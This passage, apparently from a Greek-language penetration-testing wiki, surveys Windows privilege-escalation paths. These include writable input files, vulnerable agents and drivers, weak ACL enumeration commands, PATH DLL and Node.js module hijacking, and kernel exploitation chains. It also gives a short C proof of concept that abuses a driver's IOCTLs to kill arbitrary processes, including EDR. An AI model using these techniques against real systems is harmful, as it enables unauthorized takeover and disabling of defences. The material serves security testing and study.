Το προαιρετικό Windows Driver Kit περιλαμβάνει το `StandaloneRunner.exe`, το οποίο μπορεί να χρησιμοποιήσει τα αρχεία `command.txt`, `reboot.rsf` και ένα αρχείο έργου `working\rsf.rsf` από τον κατάλογο εκτέλεσής του. Μια προγραμματισμένη εργασία ή υπηρεσία που εκκινεί αυτό το βοηθητικό πρόγραμμα με προνομιούχο λογαριασμό μπορεί να μετατρέψει την πρόσβαση εγγραφής χαμηλών προνομίων σε αυτά τα αρχεία εισόδου σε εκτέλεση εντολών στο πλαίσιο του συγκεκριμένου λογαριασμού, ακόμη κι όταν το ίδιο το εκτελέσιμο του βοηθητικού προγράμματος είναι προστατευμένο. Επιβεβαιώστε ότι υπάρχει προνομιούχος καταναλωτής και ότι μπορούν να δημιουργηθούν ή να τροποποιηθούν **και τα δύο** συνοδευτικά αρχεία· το να εντοπίσετε μόνο το βοηθητικό πρόγραμμα δεν αρκεί.

Για μια προγραμματισμένη εργασία, ελέγξτε το [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) της ενέργειάς της και τα ACL των δύο διαδρομών των συνοδευτικών αρχείων. Αν η εργασία δεν καθορίζει κατάλογο εργασίας, ο κατάλογος του εκτελέσιμου αποτελεί απλώς ένδειξη προς επαλήθευση, όχι απόδειξη του πού διαβάζει η εργασία τα αρχεία εισόδου της. Πρέπει επίσης να ικανοποιείται η προϋπόθεση του αρχείου εργασίας του έργου. Ελέγξτε το πραγματικό principal της εργασίας αντί να υποθέτετε ότι εκτελείται ως SYSTEM.

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **δικαιώματα των binaries** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να κλιμακώσετε προνόμια) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Διαδρομή επιδιόρθωσης Windows agent του Checkmk

Το [CVE-2024-0670](https://checkmk.com/werk/16361) επηρεάζει παλαιότερους Windows agents του Checkmk, οι οποίοι έγραφαν αρχεία εντολών στο `C:\Windows\Temp` και, αν αποτύγχανε η αντικατάσταση, εκτελούσαν ένα προϋπάρχον αρχείο με προστασία εγγραφής. Ο προμηθευτής διόρθωσε το πρόβλημα στις εκδόσεις 2.1.0p40, 2.2.0p23, 2.3.0b1 και 2.4.0b1. Ελέγξτε την πλήρη εγκατεστημένη έκδοση patch και αν μπορεί να εκτελεστεί η λειτουργία του agent που επηρεάζεται· μια ετικέτα μόνο για τον κλάδο, όπως `2.1`, δεν αρκεί για να διαπιστωθεί αν υπάρχει έκθεση. Η απαρίθμηση μπορεί να ελέγξει την έκδοση, την κατάσταση της υπηρεσίας και τα δικαιώματα του Temp χωρίς να δημιουργεί αρχεία ή να ενεργοποιεί εντολές του agent.

#### Έλεγχος υπηρεσίας SAML του ADSelfService Plus

Το [CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) επηρέαζε το ADSelfService Plus build 6210 και παλαιότερες εκδόσεις· ο προμηθευτής το διόρθωσε στο build 6211. Είναι σχετικό μόνο αν το SAML SSO **είναι ή ήταν** ενεργοποιημένο. Επομένως, μια καταχώριση εγκατεστημένου προϊόντος ή μια διαδρομή υπηρεσίας αποτελεί ένδειξη, όχι διαπίστωση ευπάθειας: επιβεβαιώστε το ακριβές build, το ιστορικό ρυθμίσεων SAML, την προσβασιμότητα της υπηρεσίας μέσω δικτύου και τον λογαριασμό με τον οποίο εκτελείται. Η εκτέλεση κώδικα μέσω της υπηρεσίας κληρονομεί τα δικαιώματα αυτού του λογαριασμού· εκτέλεση με SYSTEM απαιτεί εκτέλεση του instance με SYSTEM. Ένα αναγνώσιμο `OfflineBackup_*.ezip` στον κατάλογο Backup του προϊόντος αποτελεί ξεχωριστή ένδειξη ύπαρξης κρυπτογραφημένου backup, όχι απόδειξη αξιοποιήσιμου credential ή του συγκεκριμένου προβλήματος SAML. Καταγράψτε τη διαδρομή και τα δικαιώματα πρόσβασης χωρίς να το αποσυμπιέσετε κατά τη συνήθη απαρίθμηση.

#### Όρια Jenkins controller και λογαριασμών domain

Σε έναν Windows Jenkins controller, διακρίνετε το δικαίωμα δημιουργίας ή ρύθμισης ενός job από το δικαίωμα εκκίνησής του: [η Jenkins τα τεκμηριώνει ως ξεχωριστά δικαιώματα `Job/Create`, `Job/Configure` και `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ένα ρυθμισμένο schedule ή remote trigger μπορεί να παρέχει άλλη διαδρομή για την εκτέλεση build, αλλά επιβεβαιώστε ότι είναι ενεργοποιημένο και ότι το build εκτελείται πράγματι. Η εκτέλεση γίνεται με την ταυτότητα του controller ή του επιλεγμένου agent, ενώ ένα αποθηκευμένο credential μπορεί να χρησιμοποιηθεί μόνο αν το job έχει πρόσβαση στο αντίστοιχο scope. Ξεχωριστά, ελέγξτε την πρόσβαση στα metadata του `JENKINS_HOME`: η Jenkins αποθηκεύει υλικό credentials και κλειδιά κρυπτογράφησης στα `credentials.xml`, `secrets/hudson.util.Secret` και `secrets/master.key` ([αποθήκευση secrets της Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Η παρουσία τους από μόνη της δεν αποκαλύπτει κωδικό πρόσβασης· επαληθεύστε **την πρόσβαση ανάγνωσης στα απαιτούμενα αρχεία** και μια ξεχωριστή διαδρομή επαναχρησιμοποίησης λογαριασμού, χωρίς να εμφανίζετε secrets σε κοινόχρηστα αποτελέσματα. Αν αυτός ο λογαριασμός έχει δικαίωμα εγγραφής στο `scriptPath` ενός αντικειμένου χρήστη AD, επιβεβαιώστε ότι η διαδρομή script είναι εγγράψιμη και ότι υπάρχει πραγματική σύνδεση ή προγραμματισμένος consumer που εκτελείται ως ο χρήστης-στόχος, προτού θεωρήσετε ότι πρόκειται για εκτέλεση ως άλλος χρήστης. Ο περαιτέρω έλεγχος ομάδων απαιτεί ξεχωριστή επαλήθευση των αποτελεσματικών δικαιωμάτων AD.

#### Ταυτότητα self-hosted agent του Azure Pipelines

Για ένα project Azure DevOps Server ή Azure Pipelines, διακρίνετε το δικαίωμα **δημιουργίας ή επεξεργασίας** ενός pipeline από το δικαίωμα **τοποθέτησής του σε ουρά** και χρήσης του επιλεγμένου agent pool· [η Microsoft τεκμηριώνει ανεξάρτητα τα δικαιώματα pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) και [την εξουσιοδότηση pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Αν ένας λογαριασμός με χαμηλότερα δικαιώματα μπορεί να υποβάλει ένα βήμα script και να εκτελέσει το pipeline σε self-hosted Windows agent, το βήμα εκτελείται ως [ο λογαριασμός λειτουργικού συστήματος που έχει ρυθμιστεί για τον agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Επιβεβαιώστε το ακριβές pipeline, τους περιορισμούς branch/resource, το εξουσιοδοτημένο pool, το εκτελέσιμο job και την ταυτότητα της υπηρεσίας agent πριν ισχυριστείτε μετάβαση σε άλλο χρήστη ή σε SYSTEM. Ένας εγκατεστημένος agent, ένας ρόλος project ή δικαίωμα εγγραφής στο repository αποτελούν μόνο ενδείξεις· ελέγξτε τα δικαιώματα και τα τοπικά metadata της υπηρεσίας χωρίς να ξεκινήσετε build κατά την παθητική απαρίθμηση.

#### Credentials του Microsoft Entra Connect Sync

Η [Microsoft διακρίνει](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) τον **λογαριασμό υπηρεσίας ADSync**, ο οποίος εκτελεί την υπηρεσία συγχρονισμού και αποκτά πρόσβαση στη βάση δεδομένων SQL, από τον **λογαριασμό connector AD DS**, του οποίου τα δικαιώματα καταλόγου εξαρτώνται από τις ρυθμισμένες δυνατότητες συγχρονισμού. Τα credentials του connector αποθηκεύονται κρυπτογραφημένα σε αυτήν τη βάση δεδομένων, με το υλικό κλειδιού [να προστατεύεται από το DPAPI υπό τον λογαριασμό υπηρεσίας ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Μια εγκατεστημένη υπηρεσία συγχρονισμού, μια ομάδα της οποίας το όνομα υποδηλώνει τοπικά δικαιώματα administrator ή η πρόσβαση στη βάση δεδομένων από μόνη της δεν αποδεικνύουν ότι υπάρχει credential που μπορεί να αποκρυπτογραφηθεί ή δυνατότητα κλιμάκωσης δικαιωμάτων στο domain. Ελέγξτε ξεχωριστά τα πραγματικά δικαιώματα ανάγνωσης στη βάση δεδομένων, την πρόσβαση στον λογαριασμό υπηρεσίας και στα κλειδιά, τη διάταξη εγκατάστασης και SQL, την ταυτότητα connector που έχει ρυθμιστεί και τα αποτελεσματικά δικαιώματα AD αυτής της ταυτότητας. Η συνήθης απαρίθμηση πρέπει να εμφανίζει μόνο metadata υπηρεσιών και πρόσβασης, όχι να αναζητά ή να εμφανίζει τα αποθηκευμένα secrets.

#### Δικαιώματα DLL υποστήριξης driver εκτυπωτή

Ένας εγκατεστημένος driver εκτυπωτή μπορεί να αποθηκεύει DLL υποστήριξης στο `C:\ProgramData` και να τα φορτώνει σε μια διεργασία εκτύπωσης με υψηλότερα δικαιώματα. Ελέγξτε τα ακριβή δικαιώματα ACL του καταλόγου driver και των DLL, συμπεριλαμβανομένων των γονικών καταλόγων και των reparse points, ακόμη κι αν αποτύχει η απαρίθμηση printer WMI. Για το [πρόβλημα driver εκτυπωτή Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), η αναφερόμενη διαδρομή ήταν `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`· [η αρχική αποκάλυψη](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) περιγράφει φόρτωση DLL από το `PrintIsolationHost.exe`. Ένα εγγράψιμο ACL αποτελεί μόνο ένδειξη: επαληθεύστε την πραγματική πρόσβαση εγγραφής μετά την εφαρμογή των εγγραφών άρνησης, ότι ο σχετικός driver είναι εγκατεστημένος και φορτώνει το αρχείο με ταυτότητα υψηλών δικαιωμάτων, καθώς και αν ο ενημερωμένος driver ή το πρόγραμμα ασφάλειας του προμηθευτή έχει διορθώσει την εγκατάσταση. Μη συμπεραίνετε ότι υπάρχει ευπάθεια μόνο από το όνομα του καταλόγου ή την έκδοση του driver.

### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων ώστε να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος για να εντοπίσετε αδύναμα δικαιώματα σε φακέλους/αρχεία στο σύστημα είναι ο εξής:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/εκτέλεση μέσω αυτόματης φόρτωσης plugin του Notepad++

Το Notepad++ φορτώνει αυτόματα κάθε DLL plugin στους υποφακέλους `plugins`. Αν υπάρχει εγγράψιμη φορητή εγκατάσταση ή αντίγραφό της, η τοποθέτηση ενός κακόβουλου plugin παρέχει αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένων των `DllMain` και των callbacks των plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή δυαδικό αρχείο που θα εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **ακόλουθη σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **τοποθεσίες autoruns για κλιμάκωση προνομίων**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **περίεργους/ευάλωτους drivers τρίτων κατασκευαστών**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Αν ένας driver εκθέτει primitive αυθαίρετης ανάγνωσης/εγγραφής kernel (συνηθισμένο σε κακοσχεδιασμένους IOCTL handlers), μπορείτε να κλιμακώσετε απευθείας τα δικαιώματά σας κλέβοντας ένα SYSTEM token από τη μνήμη kernel.<sup>[[13]](#references)</sup> Δείτε την τεχνική βήμα προς βήμα εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Σχετικό υλικό για εκμετάλλευση του Windows kernel:

Για περίπτωση kernel-mode ring-buffer με registers ανάγνωσης/εγγραφής που είναι εγγράψιμα από τον χρήστη, δείτε την παραλλαγή [USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Για bugs συνθηκών ανταγωνισμού, όπου η ευάλωτη κλήση ανοίγει ένα attacker-controlled μονοπάτι Object Manager, η σκόπιμη επιβράδυνση της αναζήτησης (με components μέγιστου μήκους ή βαθιές αλυσίδες καταλόγων) μπορεί να διευρύνει το χρονικό παράθυρο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAFs, disclosures από paged-pool και pivots μέσω I/O ring

Ορισμένες αλυσίδες LPE στο Windows kernel μπορούν να δημιουργηθούν από δύο bugs που είναι αδύναμα μεμονωμένα: ένα **race συνθηκών ζωής σε cancel-safe queue** που απελευθερώνει ένα request/CBD ενώ το lock της ουράς παραμένει κλειδωμένο, και ένα disclosure **απελευθέρωσης lock πριν από την αντιγραφή** που προκαλεί leak μιας απελευθερωμένης εκχώρησης paged-pool κατά τη διάρκεια του `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Σημειώσεις για auditing και exploitation:

- **Free-under-lock + cancel afterwards**: αναζητήστε μια διαδρομή επιτυχίας που εκτελεί **Acquire -> CompleteRequest/free -> Release**, ενώ η διαδρομή ακύρωσης εκτελεί **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Αν η διαδρομή επιτυχίας φτάσει στο `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` πριν απελευθερώσει το lock CBDQ/CSQ, ένα thread που έχει μπλοκαριστεί στο `NtCancelIoFileEx -> IopCsqCancelRoutine` μπορεί αργότερα να συνεχίσει και να περάσει ένα απελευθερωμένο `PFLT_CALLBACK_DATA` πίσω στο callback αφαίρεσης του driver.
- **Ανακτήστε το απελευθερωμένο queue object** με μια attacker-controlled εκχώρηση paged-pool ίδιου μεγέθους. Τα `NPFS` Data Queue Entries είναι χρήσιμα, επειδή το payload και το μέγεθός τους είναι ελεγχόμενα, ενώ μπορείτε αργότερα να τα εξετάσετε με λειτουργίες ανάγνωσης/peek pipe. Αν το απελευθερωμένο object ενσωματώνει list links, αντικαταστήστε τα με μια **κυκλική λίστα από fake request nodes στη μνήμη χρήστη**, ώστε ο driver να επεξεργάζεται επανειλημμένα attacker-defined request structures αντί να τερματίζει στην αρχική κεφαλή της λίστας.
- **Αναβαθμίστε ένα προβλέψιμο write**: αν το fake request ανακατευθύνει έναν nested context pointer που χρησιμοποιείται από bookkeeping writes (timestamps / QPC / πεδία κοντά στο refcount), μπορεί να αποκτήσετε ένα kernel write με **ελεγχόμενη διεύθυνση αλλά όχι ελεγχόμενη τιμή**. Σε αυτή την περίπτωση, στοχεύστε το πεδίο **length/size** ενός αντικειμένου pool που έχετε κάνει spray αντί για έναν τελικό pointer κώδικα/δεδομένων και, στη συνέχεια, εξετάστε διαδοχικά τα αντικείμενα του spray μέχρι το αλλοιωμένο object να επιτρέψει **out-of-bounds ανάγνωση από paged-pool**.
- **Μοτίβο disclosure που επιδέχεται race**: κάθε syscall που εκτελεί `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` είναι ισχυρός υποψήφιος. Η αξιοπιστία βελτιώνεται όταν ο attacker μπορεί να αυξήσει το μέγεθος του αντιγραμμένου buffer (για παράδειγμα, προσθέτοντας πολλές εγγραφές λίστας/πόρων που αυξάνουν το τελικό μέγεθος εκχώρησης ενός serializer), επειδή η μεγαλύτερη διάρκεια της αντιγραφής διευρύνει το παράθυρο αντικατάστασης χωρίς απαραίτητα να προκαλέσει crash στο μηχάνημα.
- **Στόχοι αναπλήρωσης με πολλούς pointers**: οι registered-buffer arrays του Windows **I/O ring** είναι εξαιρετικοί στόχοι disclosure, επειδή το μέγεθος paged-pool τους ελέγχεται από τον attacker (`8 * regBufferCnt`) και κάθε στοιχείο είναι ένας kernel pointer προς ένα `_IOP_MC_BUFFER_ENTRY`. Κάντε leak έναν από αυτούς τους arrays, ανακτήστε το περιβάλλον `IORING_OBJECT` και, στη συνέχεια, αλλοιώστε τα **`RegBuffers`** και **`RegBuffersCount`**, ώστε οι επόμενες λειτουργίες I/O ring να χρησιμοποιούν attacker-forged entries και να παρέχουν αυθαίρετη ανάγνωση/εγγραφή kernel. Αν το μόνο διαθέσιμο write σάς δίνει μια σταθερή byte (για παράδειγμα από το `KUSER_SHARED_DATA+0x14`), χρησιμοποιήστε **overlapping unaligned writes** για να δημιουργήσετε έναν user pointer με επαναλαμβανόμενα bytes, όπως `0x0101010101010101`, αντιστοιχίστε τον με `VirtualAlloc` και τοποθετήστε εκεί τον forged registered-buffer array.<sup>[[30]](#references)</sup>

Χρήσιμες ενδείξεις για debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Μόλις αποκτήσετε arbitrary kernel read/write από το αλλοιωμένο I/O ring, κλέψτε ένα SYSTEM token χρησιμοποιώντας την τυπική post-primitive διαδικασία:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives αλλοίωσης μνήμης σε Registry hive

Οι σύγχρονες ευπάθειες hive επιτρέπουν τη δημιουργία προβλέψιμων layouts, την κατάχρηση εγγράψιμων απογόνων των HKLM/HKU και τη μετατροπή της αλλοίωσης metadata σε υπερχειλίσεις kernel paged-pool, χωρίς custom driver. Μάθετε ολόκληρη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Σύγχυση τύπων direct-mode στο `RtlQueryRegistryValues` μέσω paths ελεγχόμενων από τον attacker

Ορισμένοι drivers δέχονται ένα registry path από userland, ελέγχουν μόνο ότι είναι έγκυρη συμβολοσειρά UTF-16 και στη συνέχεια καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` προς μια scalar μεταβλητή στη στοίβα, όπως `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται σύμφωνα με τον **πραγματικό** τύπο του registry και όχι σύμφωνα με τον τύπο που περίμενε ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ένα absolute path `\Registry\...` ελεγχόμενο από τον χρήστη επιτρέπει στον driver να κάνει query σε keys που επιλέγει ο attacker, να διαρρεύσει την ύπαρξή τους μέσω return codes/logs και, μερικές φορές, να διαβάσει values στα οποία ο caller δεν θα είχε άμεση πρόσβαση.
- **Αλλοίωση μνήμης kernel**: ένας προορισμός scalar, όπως το `&readValue`, υπόκειται σε σύγχυση τύπων ως `REG_QWORD`, `UNICODE_STRING` ή buffer binary δεδομένων συγκεκριμένου μεγέθους, ανάλογα με τον τύπο της registry value.

Πρακτικές σημειώσεις για exploitation:

- **Mitigation στα Windows 8+**: αν το query στοχεύει σε **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι κλήσεις από kernel προκαλούν crash με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να διατηρήσετε τη δυνατότητα exploitation, αναζητήστε **keys εγγράψιμα από τον attacker μέσα σε trusted system hives** αντί να τοποθετείτε values κάτω από το `HKCU`.
- **Staging σε trusted hive**: χρησιμοποιήστε το NtObjectManager για να απαριθμήσετε τους εγγράψιμους απογόνους του `\Registry\Machine` και εκτελέστε ξανά τη σάρωση με duplicated token **low-integrity**, ώστε να εντοπίσετε keys προσβάσιμα από sandboxed contexts:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: μια απευθείας εγγραφή 8 byte σε ένα `int` 4 byte καταστρέφει γειτονικά δεδομένα της στοίβας και μπορεί να αντικαταστήσει μερικώς έναν κοντινό δείκτη callback/συνάρτησης.
- **`REG_SZ` / `REG_EXPAND_SZ`**: η direct mode αναμένει το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας φορτώσει πρώτα ένα `REG_DWORD` που ελέγχεται από τον επιτιθέμενο σε μια scalar μεταβλητή της στοίβας και μετά επαναχρησιμοποιήσει το ίδιο buffer για ανάγνωση string, ο επιτιθέμενος ελέγχει τα `Length`/`MaximumLength` και επηρεάζει μερικώς τον δείκτη `Buffer`, προκαλώντας μια μερικώς ελεγχόμενη εγγραφή στον kernel.
- **`REG_BINARY`**: για μεγάλα binary δεδομένα, η direct mode αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως μέγεθος buffer με πρόσημο. Αν μια προηγούμενη ανάγνωση `REG_DWORD` αφήσει μια **αρνητική** τιμή που ελέγχεται από τον επιτιθέμενο στη scalar μεταβλητή που επαναχρησιμοποιείται, το επόμενο ερώτημα `REG_BINARY` αντιγράφει bytes του επιτιθέμενου απευθείας σε γειτονικές θέσεις της στοίβας. Αυτή είναι συχνά η καθαρότερη διαδρομή για πλήρη αντικατάσταση δείκτη callback.

Ισχυρό μοτίβο για αναζήτηση: **ετερογενείς αναγνώσεις registry στην ίδια μεταβλητή της στοίβας χωρίς επαναρχικοποίησή της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, επαναχρησιμοποιούμενους δείκτες `EntryContext` και διαδρομές κώδικα στις οποίες η πρώτη ανάγνωση registry καθορίζει αν θα γίνει δεύτερη ανάγνωση.

#### Κατάχρηση της απουσίας του FILE_DEVICE_SECURE_OPEN σε device objects (LPE + EDR kill)

Ορισμένοι υπογεγραμμένοι drivers τρίτων κατασκευαστών δημιουργούν το device object τους με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά παραλείπουν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν εφαρμόζεται όταν γίνεται άνοιγμα της συσκευής μέσω ενός path που περιέχει επιπλέον στοιχείο, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματικό περιστατικό)

Μόλις ένας χρήστης μπορέσει να ανοίξει τη συσκευή, τα προνομιούχα IOCTL που εκθέτει ο driver μπορούν να αξιοποιηθούν για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε αυθαίρετες διεργασίες (κλοπή token / κέλυφος SYSTEM μέσω DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη ανάγνωση/εγγραφή raw disk (tampering εκτός σύνδεσης, κόλπα persistence κατά την εκκίνηση).
- Τερματισμός αυθαίρετων διεργασιών, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας την εξουδετέρωση AV/EDR από user land μέσω του kernel.

Ελάχιστο μοτίβο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Μετριασμοί για developers
- Να ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία αντικειμένων συσκευών που προορίζονται να περιορίζονται από DACL.
- Να επικυρώνετε το πλαίσιο του καλούντος για προνομιακές λειτουργίες. Να προσθέτετε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασιών ή την επιστροφή handles.
- Να περιορίζετε τα IOCTL (μάσκες πρόσβασης, METHOD_*, επικύρωση εισόδου) και να εξετάζετε μοντέλα με broker αντί για απευθείας προνόμια kernel.

Ιδέες ανίχνευσης για defenders
- Να παρακολουθείτε ανοίγματα ύποπτων ονομάτων συσκευών από user mode (π.χ. \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδηλώνουν κατάχρηση.
- Να επιβάλλετε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (HVCI/WDAC/Smart App Control) και να διατηρείτε δικές σας λίστες αποδοχής/αποκλεισμού.


## PATH DLL Hijacking

Αν έχετε **δικαιώματα εγγραφής σε έναν φάκελο που περιλαμβάνεται στο PATH**, ίσως μπορέσετε να κάνετε hijack μια DLL που φορτώνεται από μια διεργασία και να **κλιμακώσετε προνόμια**.<sup>[[2]](#references)</sup>

Ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Για περισσότερες πληροφορίες σχετικά με την κατάχρηση αυτού του ελέγχου:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking της επίλυσης module Node.js / Electron μέσω του `C:\node_modules`

Πρόκειται για μια παραλλαγή **Windows uncontrolled search path** που επηρεάζει εφαρμογές **Node.js** και **Electron**, όταν εκτελούν ένα bare import, όπως `require("foo")`, και το αναμενόμενο module **λείπει**.<sup>[[20]](#references)</sup>

Το Node επιλύει τα packages ανεβαίνοντας στην ιεραρχία καταλόγων και ελέγχοντας τους φακέλους `node_modules` σε κάθε γονικό κατάλογο. Στα Windows, αυτή η αναζήτηση μπορεί να φτάσει στη ρίζα του drive, οπότε μια εφαρμογή που εκκινείται από το `C:\Users\Administrator\project\app.js` ενδέχεται να ελέγξει διαδοχικά:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **χρήστης με χαμηλά δικαιώματα** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει ένα κακόβουλο `foo.js` (ή έναν φάκελο package) και να περιμένει μέχρι μια διεργασία **Node/Electron με υψηλότερα δικαιώματα** να προσπαθήσει να επιλύσει την ανύπαρκτη εξάρτηση. Το payload εκτελείται στο πλαίσιο ασφαλείας της διεργασίας-θύματος, επομένως αυτό οδηγεί σε **LPE** κάθε φορά που ο στόχος εκτελείται ως administrator, από μια elevated scheduled task/service wrapper ή από μια εφαρμογή επιφάνειας εργασίας με αυξημένα δικαιώματα που εκκινείται αυτόματα.

Αυτό συμβαίνει ιδιαίτερα συχνά όταν:

- μια εξάρτηση δηλώνεται στο `optionalDependencies`<sup>[[22]](#references)</sup>
